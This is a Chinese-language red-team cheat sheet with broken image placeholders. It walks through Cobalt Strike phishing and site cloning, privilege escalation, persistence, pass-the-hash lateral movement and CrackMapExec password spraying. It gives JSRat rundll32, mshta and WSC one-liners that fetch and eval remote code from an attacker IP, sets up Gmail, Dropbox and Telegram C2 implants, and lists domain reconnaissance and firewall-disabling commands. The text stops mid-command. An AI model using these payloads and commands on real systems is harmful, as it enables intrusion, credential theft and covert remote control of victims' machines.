`Attacks -> Web Drive-by -> System Profiler``Redirect url设置为目标站，登录成功会挑战到真实网站``钓鱼攻击->克隆网站``克隆地址写入要克隆的网站``Attack选择刚刚收集信息的网站``Web日志界面可记录键盘`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
攻击->钓鱼攻击管理->web服务管理中，可kill掉刚刚的任务  

```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

####   

#### **office宏**

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

####   

#### **钓鱼邮件**

  

`新克隆一个网站`

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

`Embed URL选择克隆好的网站`

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
里面的超链接已经被Embed URL克隆好的URL替换掉了  

```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
若是要加载附件，需注意附件的免杀  

```

#### **加载脚本**

```
`https://github.com/rsmudge/ElevateKit 提权脚本``>git clone https://github.com/rsmudge/ElevateKit.git``>git clone https://github.com/TheKingOfDuck/myScripts.git``Cobalt Strike -> Scripts 选择elevate.cna加载``提权的EXP列表就会增加已经加入的模块`
```

```
  

```

#### **浏览器劫持**

```
`beacon 设为交互模式``beacon> sleep 0``[Beacon] → Explore → Browser Pivot``选择打对勾的注入，会返回一个proxy，服务器IP+端口``>chromium --no-sandbox --ignore-certificate-errors --proxy-server=服务器IP:端口``访问网址`
```

#### **权限维持**

```
`https://github.com/DeEpinGh0st/Erebus``加载 cna 脚本``Cobalt Strike → Script Manager → Load → Erebus 中的 Main.cna``生成 Payload``Attacks → Packages→ Windows Executable(S)``Erebus → Persistence选择维持方法`
```

#### **横向**

```
`扫描存活主机``>portscan ip/网段 ports端口 扫描协议(arp、icmp、none) 线程``>portscan 192.168.1.0/24 445 arp 100``或右键目标>扫描``点击工具栏的View–>Targets，查看端口探测后的存活主机。（Targets可自行添加）``Login->psexec进行hash传递登录`
```

```
  

```

#### **隔离网络**

##### **权限机中转**

```
Pivoting ->Listener新建一条已有权限机器的监听器  

```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
选择 Attacks->Packages->Windows Executable(Stageless)  

```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`上传生成的payload到已上线的目标机中，上传PsExec.exe``beacon>shell C:\psexec.exe -accepteula \\10.1.1.105 -u administrator -p xxx -d -c C:\beacon.exe`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

##### SMB\_beacon

```
`新建监听器(bind)windows/beacon_smb/bind_pipe``执行``>psexec 机器名 ADMIN$/c$ bind`
```

```
SSH login  

```

```
>ssh 10.1.1.98:22 root admin
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

#### **代理**

```
`>socks 690``视图->代理信息-tunnel 直接复制，粘贴到MSF中`
```

#### **部署VPN**

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
**`选择内网网卡`**  

```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```


![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**`添加`**  



```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
**`删除`**
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

#### **Cobalt strike派生 Empire和MSF**

##### **派生Empire**

```
`创建一个Listener``创建一个stager``>usestager windows/shellcode 执行，会生成/tmp/launcher.bin``CS 使用PS命令查找进程，进行进程注入(>shinject 进程id x64)，选择launcher.bin即可`
```

```
**派生MSF**  

```

```
`使用CS的外部监听器``windows/foreign/reverse_dns_txt``windows/foreign/reverse_http``windows/foreign/reverse_https``windows/foreign/reverse_tcp``msf开启监听``cobalt strike会话主机上点击spwan，创建外部监听器，选择windows/foreign/reverse_tcp指定MSF监听的IP和端口即可`
```

```
**JSRat**  

```

```
`https://github.com/Hood3dRob1n/JSRat-Py``https://github.com/Ridter/MyJSRat``启动``>python JSRat.py -i 192.168.0.107 -p 1234``MyJSRat可以-c参数指定执行的命令`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
/connect是回连地址，/wtf是执行代码
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
直接在靶机执行
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
或  

```

```
`>regsvr32.exe /u /n /s /i:http://192.168.0.107:1234/file.sct scrobj.dll``JSRat显示上线`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
**`Wsc方式`**
```

```
`<?xml version="1.0"?>``<package>``<component id="testCalc">``<script language="JScript">``<![CDATA[` `rat="rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");w=new%20ActiveXObject(\"WScript.Shell\");try{v=w.RegRead(\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet%20Settings\\\\ProxyServer\");q=v.split(\"=\")[1].split(\";\")[0];h.SetProxy(2,q);}catch(e){}h.Open(\"GET\",\"http://192.168.0.107:1234/connect\",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);}";` `new ActiveXObject("WScript.Shell").Run(rat,0,true);``]]>``</script>``</component>``</package>``>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://192.168.0.107/jsrat.wsc")``Mshta方式``>mshta javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.0.107:1234/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im mshta.exe",0,true);}`
```

```
**CrackMapExec  
**
```

#### **信息收集**

```
`返回活动主机``>crackmapexec smb 192.168.0.0/24`
```

  

#### **爆破**

```
`支持协议ssh,smb,winrm,mssql,http``爆破smb协议，两台机器，一个用户名多个密码``>crackmapexec smb 192.168.0.98 192.168.0.55 -u username1 -p password1 password2``>crackmapexec smb 192.168.0.0/24 -d zone.com -u y -p 'password' --shares`
```

```
![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

```

```
`密码喷射``>crackmapexec <protocol> <target(s)> -u username1 username2 -p password1``指定字典``>crackmapexec <protocol> <target(s)> -u /tmp/user.txt -p /tmp/pass.txt``Hash爆破``>crackmapexec <protocol> <target(s)> -u /tmp/user.txt -H /tmp/ntlm.txt`
```

```
可用模块  

```

```
`日志的保存位置``~/.cme/logs``查看协议可用后续模块``>crackmapexec smb -L`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`常用的模块``Get-ComputerDetails获取计算机信息``Bloodhound 执行一个BloodHound脚本获取信息``empire_exec 与empire交互``enum_avproducts 列举AV产品``enum_chrome 获取目标chrome中保存的密码``get_keystrokes 键盘记录``get_netdomaincontroller 列出所有域控制器``get_netrdpsession 列出活动的RDP会话``gpp_autologin 从域控中registry.xml查找自动登录的账户密码``gpp_password 组策略凭据中返回GPP密码``invoke_sessiongopher 保存putty,winscp,filezilla,superputty rdp的session``invoke_vnc 注入一个vnc客户端到内存``met_inject 与msf交互``mimikatz 调用mimikatz模块``mimikatz_enum_chrome 使用mimikatz解密chrome保存的密码``mimikatz_enum_vault_creds 解密windows凭据管理器中保存的密码``mimikittenz 执行咪咪猫(windows密码获取软件)``multirdp 允许多用户登录RDP``netripper 通过API hooking截取平常``pe_inject DLL/EXE注入``rdp 开启或关闭RDP``shellcode_inject 注入shellcode``tokens 列举可用token``uac 查看UAC是否开启``wdigest 开启或关闭wdigest``web_delivery 执行exploit/multi/script/web_delivery模块``查看模块的选项``>crackmapexec smb -M module --options`
```




```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```


  

```
使用方式  

```

```
>crackmapexec smb <target(s)> -u user -p 'P@ssw0rd' -M module -o 参数=值
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

PTH  

```
`>crackmapexec smb <target(s)> -u username -H LMHASH:NTHASH``>crackmapexec smb <target(s)> -u username -H NTHASH`
```

```
执行命令  

```

```
>crackmapexec smb 192.168.0.98 -u y -p 'qwe12323' -x 'command'
```

```
\-X执行powershell命令  

```

```
>crackmapexec smb 192.168.0.98 -u y -p 'qwe12323' -X 'POWESHELL'
```

```
koadic
```

```
`https://github.com/zerosum0x0/koadic``>git clone https://github.com/zerosum0x0/koadic.git``>cd koadic``>pip3 install -r requirements.txt``>./koadic`
```

### **SILENTTRINITY**

```
`https://github.com/byt3bl33d3r/SILENTTRINITY``类似cobalt strike+empire的结合``>git clone https://github.com/byt3bl33d3r/SILENTTRINITY``>pip3 install --user pipenv && pipenv install && pipenv shell``>python st.py``服务端执行``>python3 st.py teamserver <teamserver_ip> <teamserver_password>``>python3 st.py teamserver 192.168.0.108 123456``也可加参数--port指定端口`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

```
客户端执行  

```

```
`>python3 st.py client wss://<username>:<teamserver_password>@<teamserver_ip>:5000``>python3 st.py client wss://y:123456@192.168.0.108:5000`
```

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`>listeners命令进入监听器目录``>use http选择监听器``>options命令查看需要配置的参数`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
`>set Port 8081 使用set命令配置参数``>start 启动监听器``>list查看运行中的监听器`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
`>stop http使用stop+监听器名字停止监听器``>stagers进入payload目录``>list列出可用payload`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
`>use payloadname 命令use+payload名字``>generate http generate+监听器名字生成payload`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

Browser C2

```
`360全套+火绒没有拦截``缺点:会有黑框，并且打开chrome浏览器，功能限制``https://github.com/0x09AL/Browser-C2``>go get -u github.com/gorilla/mux``>go get -u github.com/chzyer/readline``>git clone https://github.com/0x09AL/Browser-C2.git``/Browser-C2/agent/agent.go修改C2地址`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
修改chrome的位置
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
编译客户端
```

```
>CGO_ENABLED=1 GOARCH= GOOS=windows go build
```

```
![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

```

```
 /Browser-C2/static/jquery.js修改控制服务器IP
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)转到主目录编译服务器端

```
`>go build``靶机执行生成好的客户端``攻击机监听`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
此框架与靶机之间通信未加密，功能有限，可与msf、cs、poshc2、empire等框架建立联系。
```

```
DropBox C2  

```

```
`>git clone https://github.com/Arno0x/DBC2 dbc2``>cd dbc2``>pip install -r requirements.txt``>chmod +x dropboxC2.py``https://www.dropbox.com/developers/apps/create``创建好后要生成个accesstoken，填入config.py中`
```

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`执行  
`

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这里需设置一个与受控机交互的加密密码  



```

```
发布agent  

```

```
`>publishStage dbc2_agent.exe``使用命令listPublishedStage可以看到已发布的agent`
```

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
生成payload  

```

```
>genStager [tab]查看可生成的格式
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
>genStager oneliner default生成powershell格式payload
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
>genStager batch default生成bat格式
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
Msbuild，其余不做演示  

```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`这里使用powershell格式的，在受控机运行  
`  

```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`攻击机可以看到上线  
`  

```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`>list命令可以看到已控机器  
`  

```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`使用use命令与受控机器交互  
`  

```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
输入?获得后续命令  

```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### **Gmail C2**

#### **Gcat**

```
https://myaccount.google.com/lesssecureapps
```

```
启用设置  

```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
Gmail启用imap
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
  

```

```
将以下脚本转换为exe
```

```


```
`# setup.py``from distutils.core import setup``import py2exe``setup(console=['implant.py'])``https://github.com/byt3bl33d3r/gcat``把gcat项目中的implant.py跟以上脚本放在同一目录，修改implant.py中的账户信息`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)


```

```


```
`>python 1.py py2exe打包``dist目录下生成implant.exe受控机执行``同时也要修改项目中gcat.py中的账户信息`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)


```

```


```
`在受控机执行implant.exe，如果报错修改email模块以下三行``from email.mime.multipart import MIMEMultipart``from email.mime.base import MIMEBase``from email.mime.text import MIMEText`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)


```

  

```
执行后，邮箱会收到信息  

```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
使用gcat.py也可以得到当前会话  

```

```
>python gcat.py -list
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`现在可对其进行控制``>python gcat.py -id [id] -cmd 'net user'`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
  

```

```
生成jobid，指定jobid可查看回显  

```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
邮箱中也存在  

```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
当受控机为中文系统时，回显会报错，修改代码  

```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`其他模块有回显的直接修改后重新py2exe打包即可。  
支持的功能:cmd,upload/download,执行shellcode,键盘记录,截屏等  
`

  

**Gdog**


```

```


```
`https://github.com/maldevel/gdog``功能更多:``加密传输、地理位置、执行命令、上传下载、shellcode、截图、键盘记录、关闭重启、注销用户、从web下载、访问网站等``配置流程基本一样，需要打包exe，但是要安装一些模块PyCrypto、WMI、Enum34、Netifaces``# setup.py``from distutils.core import setup``import py2exe``setup(console=['client.py'])``client.py在回显处也要添加decode gbk``执行client.exe报超出索引错误时``在client.py中搜索字符串for iface in netifaces.interfaces():``在它下面一行修改为``if netifaces.ifaddresses(iface)[netifaces.AF_LINK][0]['addr'] == self.MAC and netifaces.AF_INET in netifaces.ifaddresses(iface):``打包好后执行`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  



```

```
提取jobid回显出错的话，添加
```

```


```
`reload(sys)``sys.setdefaultencoding("utf-8")``执行shellcode``>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform Windows EXITFUNC=thread LPORT=4444 LHOST=x.x.x.x -f python``去除引号加减号，只保留shellcode粘贴到文件shell.txt``>python gdog.py -id {id} -exec-shellcode /tmp/shell.txt`
```

  



```

```
Telegram C2  

```

```
登录telegram
```

```


```
访问https://telegram.me/botfather，发送消息
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  



```

```
  

```

```
创建一个bot  

```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`创建完成后返回一个token`  

```

```


```
`>pip install telepot``>pip install requests``>git clone https://github.com/blazeinfosec/bt2.git``编辑bt2.py``粘贴token和chatid进脚本``Chat_id的获取方式``https://api.telegram.org/bot<token>/getUpdates`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  



```

```
当有受控机上线时会列出功能  

```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`**Windows**`  

```

```


```
https://github.com/sf197/Telegra_Csharp_C2
```




```

**信息收集**
--------

### Cmd

```
`>whoami /user 查看当前用户SID``>net config Workstation 查看当前计算机信息``>net time /domain 判断主域``错误5：存在域，当前不是域用户``显示时间：存在域，当前是域内用户``找不到域：不存在``>net view /domain 列出域列表``>net group "Domain Controllers" /domain查看主域控``>nltest /DCLIST:zone.com 查看域控``>net group "domain admins" /domain 查看域管理员``>net group "enterprise admins" /domain 查看企业管理员列表``>net localgroup administrators /domain 查看管理组用户``>net group "domain computers" /domain 查看域成员计算机``>net accounts /domain 查看密码策略``>net user /domain查看域内用户``>net view /domain:dc 查询域内计算机``>netsh firewall set opmode disable/enable 关闭windows防火墙(win2003)``>netsh advfirewall set allprofiles state off/on(大于win2003)``>arp -a查看arp表``>net start 查看服务``>route print查看路由表``>query user查看登录机器的用户的连接状态``>tasklist /v 查看域管理员进程``>dsquery server查询域控制器``>dsquery computer 查询域内机器``>dsquery user 查询域用户``>dsquery ou 域内组织单位``导出域DNS记录，文件保存在C:\Windows\System32\dns\``>dnscmd /zoneexport zone.com 1.txt``导出LDAP数据库``>LDIFDE -f c:\windows\temp\dump.ldf -n -m`
```

### **Wmi**

```


```
`>wmic OS get Caption,CSDVersion,OSArchitecture,Version系统版本``>wmic service list brief 列出本机服务``>wmic process list brief 列出进程``>wmic process where  get executablepath进程路径``>wmic process get caption,commandline /value>>1.txt查询所有进程参数``>wmic process where caption="svchost.exe" get caption,commandline /value 查询某个进程命令行参数``创建进程``>wmic process call create calc``>wmic process call create "C:\shell.exe"``>wmic process call create "shutdown.exe -r -f -t 20"``结束进程``>wmic process where  call terminate``>wmic process where processid="2345" delete``>wmic process 2345 call terminate``>wmic startup list brief 列出自启动程序``>wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List 查看杀毒软件``>wmic netuse list brief 列出共享驱动盘``>wmic ntdomain list brief 查询域控制器``>wmic useraccount list brief 列出本机管理员及SID``>wmic qfe list brief 列出补丁列表``>wmic share get name,path 查看共享``>wmic startup list brief查看启动项``>wmic product get name,version 查看安装的软件``>wmic product where 